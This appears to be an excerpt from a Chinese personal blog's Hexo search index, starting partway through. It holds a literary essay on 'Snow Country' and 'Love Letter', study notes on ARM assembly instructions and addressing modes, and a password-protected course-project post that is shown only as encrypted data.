<p>《雪国》仅仅八万字，却是川端康成的集大成之作，在小说中渲染了”虚无“与”徒劳“的悲壮的浪漫色彩。岛村来自京都，家境殷实，却对爱情与事业都感到徒劳，他可以狂热地去爱上西洋舞蹈，去爱上一个驹子，但他却不敢把自己的全身心投入进去，也不敢去承诺任何东西，因为他从心底里都对这个世界充满了绝望，认为一切东西都是徒劳的，所以当驹子多次请求让他带她去京都的时候，他总是表示的暧昧。而驹子和叶子在小说中则是一对镜像人物。在岛村第一次来，是没有叶子的，因此此时的驹子就是叶子，同样的纯洁、美丽。后来驹子因为现实而沦落为艺伎，此时叶子出现了，此时的驹子是骨肉，叶子是灵魂；驹子是叶子的未来，叶子是驹子的过去；驹子为了生存而委身艺妓，而叶子则甘受贫穷，当驹子心底最后一丝希望破灭的时候，叶子堕火而死了，同时也代表着驹子魂灵的灭亡。</p>
<p>通过阅读这本小说，我们可以深刻体会到川端康成的美学，川端文学的美的“物哀”色彩是继承平安朝以《源氏物语》为中心形成的物哀精神，往往包含着悲哀与同情的意味。川端继承日本古典传统的“物哀”，又渗透着佛教禅宗的影响力，以“生—灭—生”的公式为中心的无常思想的影响力，在美的意识上重视幽玄、无常感和虚无的理念，构成川端康成美学的另一特征。</p>
<p>同时，阅读《雪国》也有助于我们了解近百年前日本高层知识分子对个人命运同国家命运的理解。因为不断的战争与对外的殖民侵略而丧失民众的生命与信心，一切都是无意义与虚无的。</p>
<p>现在来聊聊《情书》这本书，《情书》的出名则是因为岩井俊二在1995年拍摄的同名电影。但是通过阅读小说我们也可以发现一些电影所没有的细节。《情书》所讲述的是一个少年时期一男一女因为同名同姓的巧合而产生的长达十多年的爱情故事。</p>
<p>书中以男藤井树离世两周年忌日作为开场，渡边博子作为他的女朋友而参与了忌日，从而在藤井树母亲家发现了男主年少时就读中学的纪念册。她无法忘却逝去的男友，于是向他的家中寄了一封信，本来是聊以自慰，没想到后来竟然收到了一封信，她于是同来信人不断地来往信件，没想到竟牵扯出男友年少时一段隐匿的爱情。</p>
<p>同样，《情书》的故事也发生在冬天，且大雪遍地。小说（影片）的开头即是女主人公（渡边博子）从莽莽雪原中起身，茫然地望着天空，随后踱步而离去。这种雪花飘落的意境，同落寞的人融合在一起，自然而然地就会产生令人堕泪的情绪，也自然滋生了浪漫的情感，所谓浪漫者，即对于现实之事以浪漫化的处理。同从欧洲的浪漫主义不同，日本的浪漫主义更加与其文化结合，在其中加入了悲剧美学，这就更使得其令人心碎。</p>
<p>《情书》是一部真正的纯爱之书，在其中不掺杂一丝的世俗与火气，没有任何三角恋与狗血故事。仅仅是一个少年在年少时对一个少女而产生的淡淡的喜欢与心动，后来又因为现实而分开的故事。这爱情很淡，淡得不会影响一个人的生活；却又很浓，浓得可以几十年不曾忘记…</p>
]]></content>
      <categories>
        <category>读书</category>
      </categories>
      <tags>
        <tag>文学</tag>
        <tag>爱情</tag>
      </tags>
  </entry>
  <entry>
    <title>ARM Linux嵌入式系统</title>
    <url>/2020/06/04/ARM-summary/</url>
    <content><![CDATA[<h2 id="arm指令集"><a class="markdownIt-Anchor" href="#arm指令集"></a> ARM指令集</h2>
<h3 id="算术运算指令"><a class="markdownIt-Anchor" href="#算术运算指令"></a> 算术运算指令</h3>
<p><strong>1.ADD指令</strong></p>
<p><code>ADD&#123;条件&#125; &#123;S&#125; &lt;dest&gt;, &lt;op_1&gt;, &lt;op_2&gt;</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ADD   R0, R1, R2	; R0&#x3D;R1+R2</span><br><span class="line">ADD   R0, R1, $256	; R0&#x3D;R1+256</span><br></pre></td></tr></table></figure>
<p><strong>2.ADC指令</strong></p>
<p>用于带进位的加法运算</p>
<p><code>ADC&#123;条件&#125;&#123;S&#125; &lt;dest&gt;, &lt;op_1&gt;, &lt;op_2&gt;</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ADCS   R0,R2,R3   ;带进位加，结果保存在R0和R1寄存器</span><br></pre></td></tr></table></figure>
<p><strong>3.SUB命令</strong></p>
<p>减法运算</p>
<p><code>SUB&#123;条件&#125;&#123;S&#125; &lt;dest&gt;, &lt;op_1&gt;, &lt;op_2&gt;</code></p>
<p><strong>4.SBC指令</strong></p>
<p>用于带借位的减法运算</p>
<p><code>SBC&#123;条件&#125;&#123;S&#125; &lt;dest&gt;, &lt;op_1&gt;, &lt;op_2&gt;</code></p>
<a id="more"></a>
<h3 id="逻辑运算指令"><a class="markdownIt-Anchor" href="#逻辑运算指令"></a> 逻辑运算指令</h3>
<p><strong>1.AND指令</strong></p>
<p><code>AND&#123;条件&#125;&#123;S&#125; &lt;dest&gt;, &lt;op_1&gt;, &lt;op_2&gt;</code></p>
<p><strong>2.EOR指令</strong></p>
<p>异或运算</p>
<p><code>EOR&#123;条件&#125;&#123;S&#125; &lt;dest&gt;, &lt;op_1&gt;, &lt;op_2&gt;</code></p>
<p><strong>3.MOV指令</strong></p>
<p>MOV可以在两个操作数之间复制数据</p>
<p><code>MOV&#123;条件&#125;&#123;S&#125; &lt;dest&gt;, &lt;op_1&gt;</code></p>
<h3 id="分支指令"><a class="markdownIt-Anchor" href="#分支指令"></a> 分支指令</h3>
<p><strong>B指令</strong></p>
<p>B指令可以根据设置的条件跳转带指定的代码位置</p>
<p><code>B&#123;条件&#125; &lt;地址&gt;</code></p>
<h3 id="数据传送指令"><a class="markdownIt-Anchor" href="#数据传送指令"></a> 数据传送指令</h3>
<p><strong>1.单一数据传送指令</strong></p>
<p>单一数据传送指令用于向内存转载和存储一个字节或者一个字长的数据。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LDR&#123;条件&#125;   Rd，&lt;地址&gt;</span><br><span class="line">STR&#123;条件&#125;   Rd，&lt;地址&gt;</span><br><span class="line">LDR&#123;条件&#125;B   Rd，&lt;地址&gt;</span><br><span class="line">STR&#123;条件&#125;B   Rd，&lt;地址&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">STR   Rd, [Rbase]          ;存储Rd到Rbase所包含的有效地址</span><br><span class="line">STR   Rd, [Rbase, Rindex]  ;存储到Rd到Rbase+Rindex缩合成的有效地址</span><br><span class="line">STR   Rd, [Rbase, $index]  ;存储到Rd到Rbase+index所合成的有效地址</span><br></pre></td></tr></table></figure>
<p><strong>2.多数据传送指令</strong></p>
<p>多数据传送指令用于向内存装载和存储多个字节或字的数据。</p>
<p><code>xxM&#123;条件&#125;&#123;类型&#125; Rn&#123;!&#125;, &lt;寄存器列表&gt;&#123;^&#125;</code></p>
<p>其中，xx可以是LD，表示装载，也可以为ST，表示存储。多数据传送指令用于寄存器和内存中多个数据的复制。指令包括：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LDMED    LDMED    ;装载前增加地址，相当于C中的++p</span><br><span class="line">LDMFD    LDMIA    ;装载后增加地址，相当于C中的p++</span><br><span class="line">LDMED    LDMED    ;装载前减小值，相当于C中的++*p</span><br><span class="line">LDMED    LDMED    ;装载后减小值，相当于C中的*p++</span><br><span class="line">STMFA    STMIB    ;存储前增加地址</span><br><span class="line">STMEA    STMIA    ;存储后增加地址</span><br><span class="line">STMFD    STMDB    ;存储前增加值</span><br><span class="line">STMED    STMDA    ;存储后增加值</span><br></pre></td></tr></table></figure>
<h2 id="arm结构"><a class="markdownIt-Anchor" href="#arm结构"></a> ARM结构</h2>
<h3 id="寻址方式"><a class="markdownIt-Anchor" href="#寻址方式"></a> 寻址方式</h3>
<p><strong>1.立即寻址</strong></p>
<p>立即寻址方式中操作数已经写在了指令里面，取出指令时会把操作数也取出来。这是最简单的寻址方式。</p>
<p><strong>2.寄存器寻址</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MOV R1, R2     ;把R2的值赋给R1</span><br><span class="line">SUB R0, R1, R2 ;把R1-R2的值写给R0</span><br></pre></td></tr></table></figure>
<p><strong>3.寄存器偏移寻址</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MOV R0, R1, LSL #3       ;把R1的值左移三位写入R0</span><br><span class="line">ANDS R0, R1, R2, LSL #R3 ;把R2的值左移R3位，然后与R1做与操作，结果写入R0</span><br></pre></td></tr></table></figure>
<p><strong>4.寄存器间接寻址</strong></p>
<p>该方式把寄存器的值当做地址，然后从对应的内存中取出数据。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LDR R0, [R1]        ;把R1的值当做地址，从内存中取出数据存放到R0</span><br><span class="line">SWP R0, R0, [R1]    ;把R1的值当做地址，从内存中取出数据与R0交换</span><br></pre></td></tr></table></figure>
<p><strong>5，基址寻址</strong></p>
<p>该方式把寄存器的内容与指定的偏移相加，得到数据地址，然后从内存取得数据。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LDR R0, [R1, #0xf]      ;把R1的数值与0xf相加得到数据地址</span><br><span class="line">STR R0，[R1, #-2]</span><br></pre></td></tr></table></figure>
<p><strong>6.多寄存器寻址</strong></p>
<p>该方式允许一次可以传输多个寄存器的值。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LDMIA R1!, &#123;R2-R7,R12&#125;   ;把R1单元中的数据读出到R2~R7和R12，R1指定的地址自动加1</span><br><span class="line">STMIA R0,  &#123;R3-R6,R10&#125;   ;把R3~R6和R10中的数据保存到R0指向的地址，R0的地址自动加1</span><br></pre></td></tr></table></figure>
<p><strong>7.栈寻址</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">STMFD SP!, &#123;R0~R7, LR&#125;     ;把R0~R7的内容压入堆栈</span><br><span class="line">LDMFD SP!, &#123;R0,R7, LR&#125;     ;从堆栈中取出数据到R0~R7和LR</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>嵌入式系统</tag>
        <tag>ARM</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机系统基础大作业</title>
    <url>/2020/06/02/CS-System-Final-Work/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">Hey, password is required here.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="322be338fab418e1c24b59ecb3a892c37625f251549165571bf0ce0b684c9033">bbb33902094af7525c68528baa48ee2fdd75b76f97b2937d6a21eecac1d64b276ed8fef864a91ad8bcd13bc871edb11dd0978c7cc596d2adf5fd9cbfd5155d2bfc2b692af6440b8f4a8ef7370788bbc63d270b6214299478ec5a0ec1f8cdc27dfb20c7f59397341bb6c7b946418314c085ea7642a7a64878d83e84bf87bedf7c3a8398b373b3ec32753ba474a556e61ee2d03c6a079c3d004344e6733c07d17ab8ac94e54bcff410150df3e6cbfee899a2c9ac2a683d583908fffc72ce8de7099c8291d630a003bc56a3c5e82a3f34df0ceab5dd56a227b5f9660c848256a0480619e0b956df819177e9b868101ab6c95ad2502e38ae1b18b7a406abad2e2d0b1795dd010c6a6eb38a39534d2ec465b93e1c12c6d4f154d351ad3713db812aa5a1ded41f9d41f565c0c625ad6255a6026d1a956a90146e2f85cdeb54a526a3bd23089529e1eed6138dba371088d587b51f4cdc7953e166175c9abcfa4fddb282adc90891cd8d12fc5f698523633c7ef3cceafd40bb678ef28994293e3b5abe462dee11a5d4722f2bb019e1beaa2a3179cfc2c9cf624f73a5f85befb5a735c5eae4e49ef6625d8a66f541263e8b3ed2f498dcf2c6a5173c6b47b8b36181b2517e717db020134d7eb21ee0019cb86facdba976740676c5cb4d156c862930a943b17574e82c4e3030f90bfca13da6bef98453d1d57d5e31cf8de158dd11fbde5949f5d446ee352006effddc5190c0f37f461dba6c6e7bb2088dcd2610a1db0bb9c35388ffcbc4587738acd095d8a9d7fc8d66bcc15ae81bc7bb191d78e426d075bb01f21c4130eed36374ccb8e2461e7438b21de76f417c324a388ab28bcccbbb51ea6362d474555d2e76ec43b2ea32b972338296027ccf008fd1fd99aedc017edb8ee0de0bbcde52cf64e75863a7a8b70be464e66ce037575bca21a6cee983c95402f9db665c56351e717436bc4b9f567d27811f99f3ec77b9d63cd869eeb7a5570376b571af23259fc6e858873704dabd69417ab0ab246c7c3ab4aaf802f3e8112885bf431f8c181ebef887375b444a867148818da864cd9bac68b93590f197a6d9765ad81603f0a82bc58e8e0800d3a59b4ca7353e81b4b95734ce44c100459050f2452fc287b10609f717c30e4aa946e216b0fb636bc795a0877267bae2eeed96c24015c2a172718b87df775cbbd13a7fba70afed84bb88b1374a7bbaea6242c525491fbc0cc6fd1e330ca250c0dbff5a41021af7cbe1a8a92ec60d60c063fded112e0ee378e0723bda30d655e9cfc3610f05d5adc3e89511eb9e461b3f9a643ff5c2ebb030634cf3ec3426cec49d44febaf9a543c4baddeb171c8de408beef9a1078a8c4548dd3ae9cd19ee6bc1c145eb025cf4262710ccd5a517712cfc5df31d6a2c06761ae2714a720483a99e96b4f5a5ea9eb019113138493f8f89cf6a45f155854a0944d2b7a4d5a20f091d1267be33a480a71679635e3df9bdfa703945f222ee241f41dc7f8f46b77aa9c62641b4296cfd131387e5cc589c1acf31c10607c46d6db55c671bc21a6635f2fb705f7098c5736914ddf8705daedb3e7a475a8037e330181fe49d210904bc28236f008847c44b7974e888f52a72df8552a7e09ff0f9d0db3e2d4886ff370265cacf0112d891bb6da5b5bd8d378124585a7ea3b95f9b3e90d220fe3d6e788319b0b36c3c1c6796e9252e1a7aa297dd9231335c4973bb48cfb4d02574a3a7d7e336f82a9fc412298f3be7161ac8ca3212d2ac15d9c1ac862a45f6d47a17373e5070788cc862a0671ec397deab7967c7697dee0cffc89e61f3c7ebc6df4565027bf38efa17794b681f1c5688bc1422553b4d23dfa07db84f4643e577334d14d4fa4677af6143881a8f6b89dfdc087b6b8e868330e1f3bca9e36d16648a1a586c02e298d3520142f2c619d7a8bbbd49d0e297191102a5fe11870c587a3a5333bfb674fba74d6354b0fa951973f8c717c7485f24da32961bebd34f60b41512f7c5aa0303e3d32ff4f760636a2a2c09d6d4c1740d52b2cbb44ab47b3cc67391cad902cda843f58fec26c88b0b055851ba7674b04536ddcbb4203b72e67b609a0901bc365569165c2855011ac5a8ca5334e590c6d7ccc993a813e01f251c48d0b2b37238b452a1a4cd431b6b185a956873c3c9e019fe1d5d8e1aad70e63865ee476faf15226a79374c00038f3ebbdb038dc33dfc781f36dcf9f2bdf3f3ac863eff16bade9c01ba3211fceb8ffbf85616ab3e2eb79390cc70543e9071a685780ca3410ca7c97b306259a94f97ba798007c3d471a238052b68cf456535ca9ac903dd473a9d5db15f5dcf95d6aa2626e57e191499e8a762cd588d67e096a10e47688b03f92b9b1d212cf5415cd5c68d3f04029f8d8b1fa092aa9c1f337d6788db7cc5ec1111f32ff64694b624bea57bbc6059eb1f01f9c01eb63f101769ad84514a9d17a78e791988dd8edb50684a6ac936293afd611f1eccab361cb53c70ada42230b06d5f2f5724719a3f4610240507603bd5d0230dbb2b218980c770fd89a29a3c9d660e002d2e7d367ae53d35f0e79e30c7ad1be195c3bff17632148a27b96f54b33dc2d60752fa7cc91726d442f6bdc695807dd145cc74dabb141cf5ff68a5bc46e1c8a9d1bcb60bcdf99e47f4c573770809c7ac65242e6b39a3b7bc42bcd6d10c1ccf3d27f6f5b872159569d922a98832ec2079fc42946ff22f904fad892ff63d67f9bb8681c4444369a9233338fdc8225305b006b759a7012d9378216b0feb543c1cb7ff5a03f9a61182835b1ef2d38fa7f57314a894bf4118c557faf4ea81882ed8710a387a756ed37769989b7df725efc844ae794701ad6a8c139ee626eef93f50e08213931dcc03d8b9854406de39237fe9632b52a0ab0aa04529cff2ef38c2e12724abb3e530455012842bf6a0414c05ee1a80ebd54781194da7eac9e40a520dcadc7f07c6fba18e2135664ab0d5d49c6f91d878f61206de0f15133535e9157d4aefef12ff61cf1a3eae4884004921bf9630bb16e74196d1a8914a0c85e6814e6c3667191d50ccd32d13ccc142ce5932903723eb3494db5536df2cb3b7cf4671803f63d795fe813dd34b30d8a813ba422df4ff0a8653ce7d0732a20dca99dc95caef435db922057a49a4aeadf3161ba365f3eecb319f6199ba9d7fdf87098de9e323a6a2c7c93ff119af16162afcfd52e6fb207182673a13643cc76c3016537d5bf151d40912ee2fbd1a232e6629081908b0c9d219d4d611e67ce6122723efc984274b455ef389b6b88f572b5be8171f8c82076cbd243ddb20022c624845f1449437dc5ea16e8831376ba9a42730151c5ed60612d2f1cbd9f93ca65c185cd370cfc67ab42cdedd9681395e5b96293adfc4c62d9c813a804b3b56d7562767c20e89c2c067ea11596131df8f59b93b9aca733b9bbad5eb23af93aaba331f12b4f062b3073fa3133f1f89f88560a89248d19b98894cf5fa9848ceac1b5eea5bdf66ec6ec0e21ec5a3d89ea7719107cf458fc19c0f54599cacfde62c7592cc85cfe76f16cc53f76b6f552ff6fdfb61c2fc73d6c7b4e9e99d2e4db353a5905e0c6b3bb5b5a41cbece1b92c3077f1f921a4176f20821fc00c69117d7eba337c51e75fedda4c21ff3b43f2fd88d3bafe9ec876b87b5523c88ef9154a348395f23367969cf3d11ef242c991006f8b7d140fd496eaabd2fcb5751d2aa37778ffc4e3cefc3f231f808e71e63078c2cd5c67a74a10aa58609239f967bb13af49c6f361bac6c2909187249ae1b2af9c323cd02720e981bfc129fd0816649306bf671791caf2e88d6a5878b9ed15d08a129d7a8a0482da707421cbf463f544c51446d7ad724a76f8327d19112df56acb726a3f05f5d317fb3f382b56ef6c6ead53bb5edc251d6134f1bde9ca848c9451a1c00acbeb706e598703aef8958ce93944e31d7ad450b7659e32c3fcf4874ffee668c057d804a13f175553f9c0d045fe6627a1bd537aac8e08d86efe1eca832b063037acd9df4c629b9b65816673759a1718c3cdf2eb252a9940f0ae25f6bf7f34285f07518f520c390f9d143a0183ea9ff85eb1ae492f54abdd18947b65cf8571878f98fdbd1cad7ca4adc12a921f1d5352bea2dbffbaeb904c180b0a911e19e75a02058b437cb2e5754e5678248cb1ef593674794a2ddc6d920d8ba793b303fca715252452bdcc941d41bc0acdc9e7341a361e2506a6e5dde1df7e1c33ccf7222d2a7ba2ad55c7bd5340c9e242bb19d930d0c7dde8dcb20e8c28d3b119113a01ba4451b01fa94e2be156f8ce7e6e5382c7a1ed926cc04cdaeca36a781c906b384194f3271c3b56a714cd1f2efed8fc372a553d4eea7b9e739abe60525336c5177a35f7b3729dc383dc8ca3ab46316198e5ad13f510641e3aaf8f5725623bef2274880ab1d092b5e89c01aaa75725f595023cb0c7de7acc30336f85469ac41914827b91becd6dd1dd6d5c2f1a647b431ce69fd1f0851b723f755359522a639685c1fe7913bc21e943595dc75283b55bffdd9cfd775f500db9bfaae6c73e033535fa47e67c0d53286e9d96eedc0ec8526ed0f66b31d086b501eba252f8fa8e7f65ebce0546d8f08e59a144c05d4bb4e1cbb83bac19e7552a00815495369a494275af507a484f799279b63e91c17c06cb3611569d76a74d15a1f459b4d47047b2372c0155770645916a7b182a95a1cd637936a9bc95a3259ae31af06047d39427dc11e8426a47b9679c19dfa4ba44ea72e7f00b6cd84f16d3841559ff88b92fc37e11236e2973d48212c88c2fe37f675b4274f47cbcadbb64c39b7614b647d8f9e2df7aeab67acf25144a74d6355849ffd1475a98ffc9f98169397ff4ed8d4995422e371894cb2b57f729dfa0ac72d2e69b6085e05f0fef49ebc7e736c4532b3a0dc5fb2da99c9702dadb6b77a19c6a9f84fa1103f5aeb013227c69b026c1e4b6d55901ba2a67b8add66fb96de7988ec9db2fd3bd5950e16b5b9bf04d698be71ae9903c567be37d8507731b30d8e107d4f07c8715c768c92d8fc19a708c8d0d76232918ca9925eba3b0b51bb9a9446cf26c95930dca347f6791f3934dd377061c4badc794ab75ba4217c5cb88006d5dff2c7f8ab5461a8b51e9323f5ad09f1dcb4869fcf918320c5efd89baef1c51f0177a668cec31c91c49420ebd629891d9898849ffefe8292b36cddc33b57deda3901c74f0e3b6d7594c830920f6343981ba239083066615310edad6e03fbcc7296b38cfa8d3b5df67091a4f135fc6f625dcb0b7767d404553dc83aa3d7be8c15191d7f3c11c4bfc72da093cfc3a0f0c0e85f028ca8db8d0c7db21cb7acd40b765ba60ce4d0d06945bd29007bb54394fb0b1ddc91df0cb2a6b13132e4daa5624cbe0500ed7e4911a6113bd0aac43bb89e8c4f2bb520e86b2308c8486fb5972b09a92b1b473c0d024931102f75dab008475bbbf54c1edf8ba06f22eee4031bf41c12a32ed866e97271854396e8a2c85c24a530c20fb174326f120177f9f4813b71202c67006ca8e8eb894e78f2dacc74b6d91ef3a65303b4c49d5c310852c366a28408897678e91617e383c608b58a8a116bd0e5644eb6c38e8c25b8dc56e2f928d6721245e94a5a3e3774899cba224ddd656f1c4b6d74bedb4c98acbb50d0179b13a3729407ac6fe77ed1b5c3233661a4cc9d7e96a396296fa313a58ba41c7b42921fcd4ee16a717daa254758577bd5b47eaa1babc0f49a26267849d1bc49a1de94e62cc5035035b2736d847de18a5a2e6a025dc4895e7976114dc18b4e3ee9279549164b1952afaf844fe4b5557436fcb670bd99feedc8bed9a24f4496d2154bec6dfeafe427ea161acf8ea8ab0a3bdd19dd1ed93e9be10740b89bc89eb802e9c110a96c9e63cb734c5c3f87f9ab967a3e5a57f3940042e8b4ed00075dd7220a1b7ad67cc8f7b09d89ee6195d98c7d61214115a11cbea7eb6169baa6fba2ab4c2179c10ad835347438b954a4298e96236c8b5fbe5c975b953a39abf5327dfe8579a80c4acb1aa786c6fa75d1cf93123f5ce5afc4cc870b3af0d46708c2baadafe632cc4a79887169d02894bf2d3e321443cb96b20ebfb595ac168e4b12badcb94c8b71709543a2f9a740a9a722e5a9e3f1d2a48aa2c319ff20fc0a5fa717fe95e94e75fe4a3463f1f5dd7629432d567ec61e0c8957117642503359fb5bb2a78a593fd1a921341fc5d0afa865c3de057fc04b82b3bc31f00369f27de49035562f21ec957b794ec395e47e19512874f4a53c9c3689a268f9c8b925d04a820035af30e3ec095e595b274504b782187c782249dc7d37efeebd330b24980d3e5555f63369e4dcb683a20ba75977060ce3ac186a6a14855caa9523431881e31a252fd33ecdb5be7cd1a021a44bedc989c185f2fd2cc3785924401873c380456a650ee17fc701c3def7fa13a8a927df3b19b7abf850fed0ebf1cef373350384d0800140f23152ce5454079ac9c58523d520954b85bca111b7d68d1c3e0403e03ebd74b82e35b33343e00e714647720591b940ff7b70b15e1ab9009ac27314b3944953688e1d96b11140f2be39f7afdae4ba559d1ae8f720b53036bd158a3a438e3d24ac3cd4af8240d2837c66e7d6a888c83e331b989b4cd1c1ba70938e55925833ecee2bd5aa40f2a31eed3394d8a658c658c8e4d5e191fde43371256072f45b9ffc41bb5d00792fc4f79e07e7bdc6a946bca40dbecf16b14cae8d987cf44ceaa05be1edccd26973db9deb98d126f2ba1a457e38757cf09ee81ca7eef599c89f8628661128dd4c8c0c8ba281acaf551ed7aef4f596add38cbdb9efe6753cee0902df655c50c36cf1075d52b66d3247848652b82e389612a4287902ca1b76a99589dd3b5c1483c1bf4fd8a2d5c78134923c68822ff9b77b5453c8c484a0308480e4386c59b621e736f1e59fa848f8a634f3bb040a2dec9eb005056eabdc66dc60f2a59735170d5363ee4e69b44a0e214432ea6a3d962f57a2b315e592c25215c2699400cb50b79d60fb1f5d63a1e7c0bdb7594079f078f222a5f90ad3ebff8e16f3904401721c5f86e6bb90453308641ed0c6ed583e1a548e6a62f729c6a30119127d1e11370c08f78221a77ecee8a0276fe3b1cba88716007a090b284eff28133d65272c1917d15b56b9ba2418412319979734db695b03217d06d5a5bf11320731a260170a68cde84c6229d3adc94b5ad43dbe9c531584d3bb1f7013def5d4a5f49951468e51fc89b7aeedd036c03a77ef64441865adb45724d8970326fd3e42c3d5242f3ce6e991a23c1d4a6e546687380892241a7b336cc6002dfc8595a3cffb478bf44a363e916770409ba8b79ee2132e0a4589ee2e005c4edd4a2e3ac8346bf351cc8ef1e618f6ba11c640588c306fc0497ff9b48580d52534111840cb29628c5dcd0a989056a34f57a36d70fea35006ab535bdfce429c50a92f49ee731ebd00be7103600cd3a6f434a8582b90f193a0c3949c7562b9d7af71170bc5dbff4866ed4c0e2ddad380d233631b85648bde343dceeb59312cc76b51cf3233a2f9fb79aaa8223f776b4e24540d1a9ea9a1b5799bcd1859cde5ec1c239a6c6f41470145ead5dcf4e9897c417b2264a6a295b9d70b873fb49cf4509b17d045c9eb84b11149a64a9015b6244ea9ca6a2109c7ee38e8617bd1962485fd56fac43dfb49ce39d77ae105c2d1b70a59072ba6c80d5094a4dd3a979f68e891d47d19b8ccf81f8e25d02a077248988027f23a6048f860cd1648a3c5e48c5985bd61b5b778b8a6ea463c4f4d85bc8883d9518a7a0aa988d495198c826c1ebce650f7de7f3d596b502f875d3f2b3995f74d3f023602b03601d05890a2157f9ed2905a35ff5d6dce0d80abd1cc66d9e6c56d0e2a73a24b5abb357be1faa8fb4511123b768afb62712591def1bc198c068264246c5bd4e6072bad6936ff1509200e0af04083fa7692ca9653744040819ff571c739d18c1ab402aa55192bb9e36c8f0ed62d242b61973eb0f756a42be0f03b8d5066e8a2d0772e8ec10d3de75a6cad2e429c03beb8cb01c8867a2572a10fd9d65131f41928012eb888b725d7d0899f7038eca17533b874626858df87289e1e3d3adbcfa3342164d44c31134ddee472858386b6ef192e8d58ecde7e922fc1c56a8f13ae81a42d2fd116f736a580c0d66d68a39eb91eb59b4ea139be9e10a2a673d12ad633e78b901644b1fff314f01ca34a2d38f5272fb526853b1b9fb9893527ab00ab9a8cf138f9ab6d7a83c273d68ad9b38d72f768b67cc4064487d4f465cfa72e2ed0f467a3cd48659e7673246d62ef53ba060b07d96766e27dccec79712761dfdb59645b0d608172c06845110d2992846620a51f19494f99995ba2e0512fd479303e08886c81acc64e31c49a0de68d5ed7998ea5ebce54d873418fe106197b3c8be56022ea7a3e26e0da618f327946b31050a30cc8d0800d574882912164bef238b051ab3f3058672849f47a198a7b950e9198f9d84569fb1c339837ea5b9220c865d4c9cf45c02233dcc9961397525bf20e108a565a43cfb36f19ba6086f83366fc33594bc72b322d1d9cb2da856e1f4f9b64d170cdfa5bd2d0fea174aab8d551d88a16e2fc01ec459777661c29e995906e11b52dd35aea8393ea1c39a9cdc1238f7c17e20f5fb3f8e55620a4a32a810bf3fb71ee159d12ed18a90ee9a3456334170ebce085a3dd385b3218e30083d96723903b8e8b6bf7b1dc11a4fd7642a2d84e94865af9f2bceb61c7de512764d4e655e0018bafa921c8d3915f754aec9ad76bf43bb107bf4bd541d5fa4ba3e87e116b03c72ffbddc3e46fd3742128e57aef73232762e2bd78e566b08cb7b07af425167118f1b9af250c28a09b530b5bba6f02d1344be868d35773168f016fcdf2bd17f7de96f6a55bb9149d5011f780f86d5e00690b9eaf51f8bb1eb791a8ef50cbc568141bb2fc25d166204845e7db148ad4efdcac1c574b1647965b0255f336c4c68281fc1ec26be7f32513779d187b5ce7b75353d806c29b3f8fb81aca47dce833af7a79a86b750c83a8d67d92ddd47d3afbc691c237243d1d96ad851c69d8ddad4afe117cde81e2366e765fd02c6f939de0c3f10942666d6057aeeb06a2dd1fa31a9daf66d6bde4b6f95c543556fa2433a5c58d45dcef30d1be9f9fd4b0188e47ec9f81436552dc3bb06787ee9be7705d52aa4062ad925eb35473157c37ecdb9d05b3a7788c7993840a03aaf0e423c6fa6c5f05516e58d3abdcc6a3efecd7eb95852a6d22549bde8b4151e31e7aa92ac06ec75fdb9756ff96a4f232e717bee55c00e003cb72640e52a7d1d409159ffe169d3a81704d5c4d8a22d2d1e44bb3551fbc342c245697916caee32d5beeab563f155296abbd974c63e1fbf68f0f3a0478c8ff1f3010076740a6009949ba1ba286418d97d8d8462d62bb2506ac857b3bcf8021ea4b73a9f315f928dac63687781b1d12db0517278c3bf5110140dd01e8852278272e8ef0847d33bc99c54fe6e3bf63dd29e14192a135089f1ef57ba5f7efc8b330335e110e5056da08f8b4a2d40149f60f8fb2cdb93be7778ad299b55f3d8c2f4efeae2e99f115b84447baaedba478e62095cf5b1451d40108f15c8b782ac33de2ebf250008c7738ee6821c384b98f4500ab30fe58a236e13f6f60c74f08873b2abc31cbf9c54ee0cbcb0ad2066d9200bf3f5c77e6c5db624e36a444bcbf5eaf90b3e681ae16f4d5948d891431f73a6bd21e6e2849062ef497410322995e659ab7a85c75cbe5b0d64f2c923355b78e5ccc48f7b16c2e59b2c906fb4628eda491f3a8715d150c84d95e7327fd27dfe80cf4aea7198733994d965a6d586092d92874f2458f8e786a2b44ea03649c0b5ff1c5423ed0dd505955b4dc390ad7e68d52de0d8c1b9cd657d86084a975e85351179b29d4f52180e5660e5c1d30f3b20492dfd7b1a93f1cdcd84397223a98fc8ce868a8de910b4b2390c26b160209126fb30fcca68715af024d5eccf8ac08ff9ca03b16239f1242daaaea67b0fa9c3a1541e8d024986e88fc7ed9fb2ca3c33e6778cb94236598f4d0a725f7b5893963bc9ac1c3c20f4bb0cf1d4dbfa623706488d72eab80531a4e1895bd3d26fee59bf5058e950190021f33cd3db3b1b42350a90df89c3edde0f107481897d5dfbedc8729dcfa5045b4fe3c1b15041ef024a4f59497fe1ca70aed07836583d563b9fa19df8550d36a898410db0fca2f5475d2817106ea49144ce120c78cbf59b73391b32ca7a9ec86bcf771bff441ee0a274658b181ec02c61f343e302b1cbe3098f495b7d5dcc1db1912d51634b3392a96be6f62f6860bf5239f37e2093eb62dcaa08376d91ab9203d97cc4426b0c9b5b2551d518e15c50faca36484fe14ac3a8e1019a3800051fbc2af748b9aa114ee3a586fb029fd92001adcc65efa1ffa1ffa7b0dd26bca54fc95421189aa39be25d5e5f11b4089b470fc188d5e2b409108c46523c99dd187aebabbcc2cb124469f6af6c7